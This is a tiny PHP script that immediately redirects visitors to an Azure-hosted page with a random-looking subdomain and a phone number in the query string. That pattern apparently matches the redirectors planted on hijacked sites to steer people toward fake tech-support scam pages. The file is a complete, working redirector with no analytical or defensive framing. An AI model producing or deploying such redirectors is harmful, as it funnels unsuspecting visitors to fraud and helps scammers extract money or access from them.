<?php
// Define the destination URL
$destination_url = "https://quads87core8cumpu87.z1.web.core.windows.net/index.html?Aniph=1-805-670-2136";

// Send the Location header for redirection
header("Location: " . $destination_url);

// It's crucial to stop script execution after sending the header
// to prevent any further output or unintended actions.
exit(); 
?>